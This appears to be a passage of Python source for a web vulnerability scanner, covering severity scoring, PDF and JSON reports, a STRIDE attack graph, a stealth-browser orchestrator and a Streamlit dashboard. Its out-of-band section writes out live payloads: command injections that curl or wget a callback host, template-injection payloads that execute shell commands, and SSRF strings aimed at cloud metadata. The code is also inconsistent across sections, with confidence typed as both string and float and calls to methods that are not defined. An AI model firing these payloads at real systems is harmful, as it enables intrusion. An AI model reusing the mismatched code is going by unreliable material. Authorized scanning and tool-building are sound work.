# SEVERITY & SCORING
# ============================================================

SEVERITY_MATRIX = {
    "SQLi": 9.5,
    "XSS": 6.5,
    "SSRF": 8.0,
    "RCE": 10.0,
    "IDOR": 7.5,
    "LFI": 8.5,
    "Open Redirect": 4.0,
    "Info Disclosure": 3.5,
}


def score_finding(f: Finding) -> float:
    base = SEVERITY_MATRIX.get(f.vuln_type, 5.0)
    confidence_weight = {
        "HIGH": 1.0,
        "MEDIUM": 0.75,
        "LOW": 0.4
    }.get(f.confidence, 0.5)

    return round(base * confidence_weight, 2)


def severity_label(score: float) -> str:
    if score >= 9:
        return "CRITICAL"
    if score >= 7:
        return "HIGH"
    if score >= 4:
        return "MEDIUM"
    return "LOW"


# ============================================================
# JSON REPORT
# ============================================================

def generate_json_report(sessions: List[TargetSession]) -> Dict[str, Any]:
    report = {
        "tool": "F16 Research Edition",
        "generated_at": datetime.utcnow().isoformat(),
        "targets": []
    }

    for session in sessions:
        target_entry = {
            "target": session.target,
            "duration": session.duration,
            "findings": []
        }

        for f in session.findings:
            score = score_finding(f)
            target_entry["findings"].append({
                "type": f.vuln_type,
                "vector": f.vector,
                "confidence": f.confidence,
                "score": score,
                "severity": severity_label(score),
                "evidence": f.evidence,
                "metadata": f.metadata
            })

        report["targets"].append(target_entry)

    return report


# ============================================================
# EXECUTIVE SUMMARY
# ============================================================

def generate_summary(sessions: List[TargetSession]) -> Dict[str, Any]:
    summary = defaultdict(int)

    for s in sessions:
        for f in s.findings:
            score = score_finding(f)
            summary[severity_label(score)] += 1

    return dict(summary)


# ============================================================
# PDF REPORT
# ============================================================

class F16PDF(FPDF):
    def header(self):
        self.set_font("Arial", "B", 14)
        self.cell(0, 10, "F16 Security Assessment Report", ln=True)
        self.ln(4)

    def footer(self):
        self.set_y(-15)
        self.set_font("Arial", "I", 8)
        self.cell(0, 10, f"Page {self.page_no()}", align="C")


def generate_pdf_report(
    sessions: List[TargetSession],
    filename: str = "F16_Report.pdf"
) -> Optional[str]:

    if not PDF_ENABLED:
        return None

    pdf = F16PDF()
    pdf.add_page()

    pdf.set_font("Arial", size=11)
    pdf.cell(0, 8, f"Generated at: {datetime.utcnow().isoformat()}", ln=True)
    pdf.ln(5)

    summary = generate_summary(sessions)

    pdf.set_font("Arial", "B", 12)
    pdf.cell(0, 10, "Executive Summary", ln=True)
    pdf.set_font("Arial", size=11)

    for sev, count in summary.items():
        pdf.cell(0, 8, f"{sev}: {count}", ln=True)

    pdf.ln(6)

    for session in sessions:
        pdf.set_font("Arial", "B", 12)
        pdf.cell(0, 10, f"Target: {session.target}", ln=True)
        pdf.set_font("Arial", size=11)
        pdf.cell(0, 8, f"Duration: {session.duration}s", ln=True)

        if not session.findings:
            pdf.cell(0, 8, "No vulnerabilities detected.", ln=True)
            pdf.ln(4)
            continue

        for f in session.findings:
            score = score_finding(f)
            pdf.ln(3)
            pdf.multi_cell(
                0,
                7,
                f"[{severity_label(score)}] {f.vuln_type}\n"
                f"Vector: {f.vector}\n"
                f"Confidence: {f.confidence}\n"
                f"Score: {score}\n"
                f"Evidence:\n{f.evidence[:800]}"
            )

    pdf.output(filename)
    return filename
# ============================================================
# SECTION 10: ATTACK GRAPH & STRIDE THREAT MODEL
# Research‑Grade • Formal • Extensible
# ============================================================

from enum import Enum
from typing import Set, Tuple


# ============================================================
# STRIDE MODEL
# ============================================================

class STRIDE(Enum):
    SPOOFING = "Spoofing"
    TAMPERING = "Tampering"
    REPUDIATION = "Repudiation"
    INFORMATION_DISCLOSURE = "Information Disclosure"
    DENIAL_OF_SERVICE = "Denial of Service"
    ELEVATION_OF_PRIVILEGE = "Elevation of Privilege"


VULN_TO_STRIDE = {
    "SQLi": {
        STRIDE.TAMPERING,
        STRIDE.INFORMATION_DISCLOSURE,
        STRIDE.ELEVATION_OF_PRIVILEGE
    },
    "XSS": {
        STRIDE.SPOOFING,
        STRIDE.INFORMATION_DISCLOSURE
    },
    "SSRF": {
        STRIDE.INFORMATION_DISCLOSURE,
        STRIDE.ELEVATION_OF_PRIVILEGE
    },
    "RCE": {
        STRIDE.ELEVATION_OF_PRIVILEGE,
        STRIDE.TAMPERING
    },
    "IDOR": {
        STRIDE.INFORMATION_DISCLOSURE
    },
    "LFI": {
        STRIDE.INFORMATION_DISCLOSURE
    },
    "Open Redirect": {
        STRIDE.SPOOFING
    }
}


# ============================================================
# ATTACK GRAPH CORE
# ============================================================

@dataclass
class AttackNode:
    id: str
    description: str
    severity: str


@dataclass
class AttackEdge:
    source: str
    target: str
    reason: str


@dataclass
class AttackGraph:
    nodes: Dict[str, AttackNode] = field(default_factory=dict)
    edges: List[AttackEdge] = field(default_factory=list)

    def add_node(self, node: AttackNode):
        self.nodes[node.id] = node

    def add_edge(self, source: str, target: str, reason: str):
        self.edges.append(
            AttackEdge(source=source, target=target, reason=reason)
        )

    def serialize(self) -> Dict[str, Any]:
        return {
            "nodes": {k: vars(v) for k, v in self.nodes.items()},
            "edges": [vars(e) for e in self.edges]
        }


# ============================================================
# GRAPH BUILDER
# ============================================================

class AttackGraphBuilder:

    def __init__(self):
        self.graph = AttackGraph()

    def build_from_findings(self, findings: List[Finding]) -> AttackGraph:
        previous_node_id = None

        for idx, f in enumerate(findings):
            node_id = f"VULN_{idx}"

            node = AttackNode(
                id=node_id,
                description=f"{f.vuln_type} via {f.vector}",
                severity=f.confidence
            )
            self.graph.add_node(node)

            if previous_node_id:
                self.graph.add_edge(
                    previous_node_id,
                    node_id,
                    "Attack chain progression"
                )

            previous_node_id = node_id

        return self.graph


# ============================================================
# STRIDE ANALYZER
# ============================================================

class STRIDEAnalyzer:

    def analyze(self, findings: List[Finding]) -> Dict[str, Set[str]]:
        threats = defaultdict(set)

        for f in findings:
            stride_set = VULN_TO_STRIDE.get(f.vuln_type, set())
            for stride in stride_set:
                threats[stride.value].add(f.vuln_type)

        return threats


# ============================================================
# SESSION INTEGRATION
# ============================================================

def enrich_session_with_threat_model(session: TargetSession):
    builder = AttackGraphBuilder()
    session.attack_graph = builder.build_from_findings(session.findings)

    analyzer = STRIDEAnalyzer()
    session.stride_threats = analyzer.analyze(session.findings)
# ============================================================
# SECTION 11: OOB (Out‑Of‑Band) DETECTION ENGINE
# Interactsh / Burp Collaborator Style
# ============================================================

import uuid
import threading
import requests
from queue import Queue


# ============================================================
# OOB INTERACTION MODEL
# ============================================================

@dataclass
class OOBInteraction:
    interaction_id: str
    protocol: str
    source_ip: str
    raw_request: str
    timestamp: float


# ============================================================
# OOB CLIENT (Interactsh‑Compatible)
# ============================================================

class OOBClient:
    """
    Abstract OOB Client
    Can be wired to:
    - Interactsh
    - Burp Collaborator
    - Custom DNS/HTTP listener
    """

    def __init__(self, server_url: str | None = None):
        self.server_url = server_url
        self.session_id = str(uuid.uuid4())
        self.interactions: List[OOBInteraction] = []
        self._running = False

    def generate_payload(self) -> str:
        """
        Generates unique OOB payload
        """
        if not self.server_url:
            return ""

        token = f"f16-{uuid.uuid4().hex[:12]}"
        return f"http://{token}.{self.server_url}"

    def poll(self):
        """
        Poll OOB server for interactions
        """
        if not self.server_url:
            return []

        try:
            r = requests.get(
                f"https://{self.server_url}/poll/{self.session_id}",
                timeout=8
            )
            if r.status_code != 200:
                return []

            data = r.json()
            interactions = []

            for i in data.get("interactions", []):
                interactions.append(
                    OOBInteraction(
                        interaction_id=i.get("id"),
                        protocol=i.get("protocol"),
                        source_ip=i.get("source"),
                        raw_request=i.get("raw"),
                        timestamp=time.time()
                    )
                )

            return interactions

        except Exception:
            return []

    def start_background_listener(self, interval: int = 5):
        self._running = True

        def _worker():
            while self._running:
                new = self.poll()
                if new:
                    self.interactions.extend(new)
                time.sleep(interval)

        t = threading.Thread(target=_worker, daemon=True)
        t.start()

    def stop(self):
        self._running = False


# ============================================================
# OOB PAYLOAD GENERATOR
# ============================================================

class OOBPayloadFactory:

    @staticmethod
    def for_vuln(vuln_type: str, oob_url: str) -> List[str]:
        """
        Generate OOB payloads per vulnerability type
        """
        if not oob_url:
            return []

        payloads = []

        if vuln_type == "SSRF":
            payloads.extend([
                oob_url,
                f"{oob_url}/metadata",
                f"http://169.254.169.254@{oob_url}"
            ])

        elif vuln_type == "RCE":
            payloads.extend([
                f"; curl {oob_url}",
                f"| wget {oob_url}",
                f"`curl {oob_url}`"
            ])

        elif vuln_type == "SSTI":
            payloads.extend([
                f"{{{{ self.__init__.__globals__['os'].popen('curl {oob_url}').read() }}}}",
                f"${{T(java.lang.Runtime).getRuntime().exec('curl {oob_url}')}}"
            ])

        return payloads


# ============================================================
# OOB CORRELATION ENGINE
# ============================================================

class OOBCorrelationEngine:
    """
    Correlates OOB interactions to scan sessions
    """

    def correlate(
        self,
        session: TargetSession,
        oob_client: OOBClient
    ) -> List[Finding]:

        confirmed = []

        for interaction in oob_client.interactions:
            finding = Finding(
                title="Blind OOB Interaction",
                vuln_type="OOB",
                vector="External Interaction",
                payload=interaction.interaction_id,
                evidence=f"OOB hit from {interaction.source_ip} via {interaction.protocol}",
                confidence=0.95,
                cvss=8.5
            )
            confirmed.append(finding)

        return confirmed


# ============================================================
# INTEGRATION INTO MAIN ENGINE
# ============================================================

def integrate_oob_detection(
    session: TargetSession,
    oob_client: OOBClient
):
    """
    Inject OOB confirmed findings into session
    """
    if not oob_client.interactions:
        return

    correlator = OOBCorrelationEngine()
    findings = correlator.correlate(session, oob_client)

    for f in findings:
        session.findings.append(f)
# ============================================================
# SECTION 12: STREAMLIT UI + FINAL ORCHESTRATOR
# ============================================================

import streamlit as st
from typing import Any


# ============================================================
# FINAL ORCHESTRATOR
# ============================================================

class F16FinalOrchestrator:
    """
    High‑level orchestration layer
    Ties together:
    - Browser
    - Payloads
    - ML
    - OOB
    - Attack Graph
    - Reporting
    """

    def __init__(self, targets: List[str], enable_oob: bool = False, oob_server: str | None = None):
        self.targets = targets
        self.enable_oob = enable_oob
        self.oob_client = OOBClient(oob_server) if enable_oob else None
        self.sessions: List[TargetSession] = []

    async def run(self):
        if self.oob_client:
            self.oob_client.start_background_listener()

        async with async_playwright() as pw:
            browser, context = await StealthBrowser.launch(pw)

            for target in self.targets:
                if not authorized_target(target):
                    continue

                session = TargetSession(target=target, start_time=time.time())
                page = await context.new_page()

                try:
                    await page.goto(target, wait_until="networkidle", timeout=35000)

                    # ---- Extract Inputs
                    vectors = await VectorExtractor.extract(page, target)
                    session.vectors = vectors

                    # ---- Scan Inputs
                    for vector in vectors:
                        sensor = SensorSuite(page)
                        await sensor.attach()

                        attack_engine = AttackEngine(
                            page=page,
                            ml_engine=session.ml_engine,
                            oob_client=self.oob_client
                        )

                        finding = await attack_engine.test(vector)

                        if finding:
                            session.findings.append(finding)
                            session.attack_graph.add_finding(finding)

                    # ---- OOB Correlation
                    if self.oob_client:
                        integrate_oob_detection(session, self.oob_client)

                except Exception as e:
                    session.errors.append(str(e))

                await page.close()
                self.sessions.append(session)

            await browser.close()

        if self.oob_client:
            self.oob_client.stop()


# ============================================================
# STREAMLIT DASHBOARD
# ============================================================

def streamlit_app():

    st.set_page_config(
        page_title="F16‑Research Edition",
        layout="wide",
        initial_sidebar_state="expanded"
    )

    st.title("🛡️ F16‑Research Edition")
    st.caption("Scientific‑Grade Web Security Analysis Framework")

    # ----------------------------
    # SIDEBAR
    # ----------------------------

    with st.sidebar:
        st.header("⚙️ Scan Configuration")

        targets_input = st.text_area(
            "Targets (one per line)",
            placeholder="https://example.com\nhttps://test.site"
        )

        enable_oob = st.checkbox("Enable OOB Detection (Blind Bugs)")
        oob_server = None

        if enable_oob:
            oob_server = st.text_input(
                "OOB Server (Interactsh / Burp)",
                placeholder="oob.yourserver.com"
            )

        start_scan = st.button("🚀 Start Scan", type="primary")

    # ----------------------------
    # EXECUTION
    # ----------------------------

    if start_scan:
        targets = [t.strip() for t in targets_input.splitlines() if t.strip()]

        if not targets:
            st.error("Please provide at least one target.")
            return

        with st.spinner("Running F16 Research Scan..."):
            orchestrator = F16FinalOrchestrator(
                targets=targets,
                enable_oob=enable_oob,
                oob_server=oob_server
            )

            asyncio.run(orchestrator.run())

        st.success("Scan Completed")

        # ----------------------------
        # RESULTS
        # ----------------------------

        for session in orchestrator.sessions:

            st.divider()
            st.subheader(f"🎯 Target: {session.target}")

            col1, col2, col3 = st.columns(3)

            col1.metric("Vectors", len(session.vectors))
            col2.metric("Findings", len(session.findings))
            col3.metric("Duration (s)", session.duration)

            # ---- Findings Table
            if session.findings:
                st.markdown("### 🔍 Findings")

                table = []
                for f in session.findings:
                    table.append({
                        "Title": f.title,
                        "CVSS": f.cvss,
                        "Confidence": f.confidence,
                        "STRIDE": ", ".join(f.stride),
                        "Evidence": f.evidence[:120]
                    })

                st.dataframe(table, use_container_width=True)
            else:
                st.info("No confirmed vulnerabilities detected.")

            # ---- STRIDE
            st.markdown("### 🧠 Threat Model (STRIDE)")
            stride = session.attack_graph.to_stride()
            for k, v in stride.items():
                if v:
                    st.write(f"**{k}:** {', '.join(v)}")

            # ---- Errors
            if session.errors:
                st.markdown("### ⚠️ Errors")
                for e in session.errors:
                    st.code(e)

        # ----------------------------
        # PDF EXPORT
        # ----------------------------

        if orchestrator.sessions:
            if st.button("📄 Generate PDF Report"):
                PDFReport.generate(orchestrator.sessions)
                st.success("PDF Report Generated (check server files)")


# ============================================================
# ENTRY POINT
# ============================================================

if __name__ == "__main__":
    streamlit_app()
